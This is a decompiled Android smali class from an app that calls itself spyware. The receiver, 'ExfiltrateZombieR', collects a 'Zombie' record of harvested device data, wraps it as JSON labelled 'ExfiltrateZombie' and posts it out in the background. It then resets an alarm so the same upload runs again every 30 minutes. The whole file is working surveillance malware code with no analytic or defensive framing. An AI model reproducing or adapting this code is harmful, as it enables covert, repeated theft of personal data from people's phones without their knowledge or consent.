.class public Landroid/spyware/receivers/ExfiltrateZombieR;
.super Landroid/content/BroadcastReceiver;
.source "ExfiltrateZombieR.java"


# direct methods
.method public constructor <init>()V
    .registers 1

    .prologue
    .line 37
    invoke-direct {v0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method

.method private setAlarm(Landroid/content/Context;)V
    .registers 10
    .param p1, "context"    # Landroid/content/Context;

    .prologue
    const/16 v7, 0xc

    const/4 v6, 0x0

    .line 59
    invoke-static {}, Ljava/util/Calendar;->getInstance()Ljava/util/Calendar;

    move-result-object v1

    .line 60
    .local v1, "calendar":Ljava/util/Calendar;
    const/16 v4, 0x1e

    invoke-virtual {v1, v7, v4}, Ljava/util/Calendar;->add(II)V

    .line 62
    new-instance v2, Landroid/content/Intent;

    const-class v4, Landroid/spyware/receivers/ExfiltrateZombieR;

    invoke-direct {v2, v9, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 63
    .local v2, "intent":Landroid/content/Intent;
    const/high16 v4, 0x40000000    # 2.0f

    invoke-static {v9, v6, v2, v4}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v3

    .line 65
    .local v3, "pendingIntent":Landroid/app/PendingIntent;
    const-string v4, "alarm"

    invoke-virtual {v9, v4}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    .line 66
    .local v0, "alarmManager":Landroid/app/AlarmManager;
    invoke-virtual {v1}, Ljava/util/Calendar;->getTimeInMillis()J

    move-result-wide v4

    invoke-virtual {v0, v6, v4, v5, v3}, Landroid/app/AlarmManager;->set(IJLandroid/app/PendingIntent;)V

    .line 69
    const-string v4, "::trace"

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-class v6, Landroid/spyware/receivers/ExfiltrateZombieR;

    invoke-virtual {v6}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, "->setAlarm:"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const/16 v6, 0xa

    invoke-virtual {v1, v6}, Ljava/util/Calendar;->get(I)I

    move-result v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, ":"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    .line 70
    invoke-virtual {v1, v7}, Ljava/util/Calendar;->get(I)I

    move-result v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, ":"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const/16 v6, 0xd

    invoke-virtual {v1, v6}, Ljava/util/Calendar;->get(I)I

    move-result v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 69
    invoke-static {v4, v5}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 72
    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .registers 10
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    .line 41
    const-string v4, "::trace"

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-class v6, Landroid/spyware/receivers/ExfiltrateZombieR;

    invoke-virtual {v6}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, "->onReceive:receiver started..."

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v4, v5}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 44
    new-instance v0, Landroid/spyware/utils/Harvester;

    invoke-direct {v0, v8}, Landroid/spyware/utils/Harvester;-><init>(Landroid/content/Context;)V

    .line 46
    .local v0, "harvester":Landroid/spyware/utils/Harvester;
    invoke-virtual {v0}, Landroid/spyware/utils/Harvester;->getZombie()Landroid/spyware/model/Zombie;

    move-result-object v3

    .line 48
    .local v3, "zombie":Landroid/spyware/model/Zombie;
    if-eqz v3, :cond_42

    .line 49
    new-instance v1, Landroid/spyware/utils/Parameter;

    const-string v4, "ExfiltrateZombie"

    invoke-virtual {v3}, Landroid/spyware/model/Zombie;->toJSON()Lorg/json/JSONObject;

    move-result-object v5

    invoke-direct {v1, v4, v5}, Landroid/spyware/utils/Parameter;-><init>(Ljava/lang/String;Lorg/json/JSONObject;)V

    .line 50
    .local v1, "params":Landroid/spyware/utils/Parameter;
    new-instance v2, Landroid/spyware/utils/PostDataAT;

    invoke-direct {v2}, Landroid/spyware/utils/PostDataAT;-><init>()V

    .line 52
    .local v2, "postDataAT":Landroid/os/AsyncTask;, "Landroid/os/AsyncTask<Landroid/spyware/utils/Parameter;Ljava/lang/Void;Ljava/lang/Integer;>;"
    const/4 v4, 0x1

    new-array v4, v4, [Landroid/spyware/utils/Parameter;

    const/4 v5, 0x0

    aput-object v1, v4, v5

    invoke-virtual {v2, v4}, Landroid/os/AsyncTask;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 55
    .end local v1    # "params":Landroid/spyware/utils/Parameter;
    .end local v2    # "postDataAT":Landroid/os/AsyncTask;, "Landroid/os/AsyncTask<Landroid/spyware/utils/Parameter;Ljava/lang/Void;Ljava/lang/Integer;>;"
    :cond_42
    invoke-direct {v7, v8}, Landroid/spyware/receivers/ExfiltrateZombieR;->setAlarm(Landroid/content/Context;)V

    .line 56
    return-void
.end method
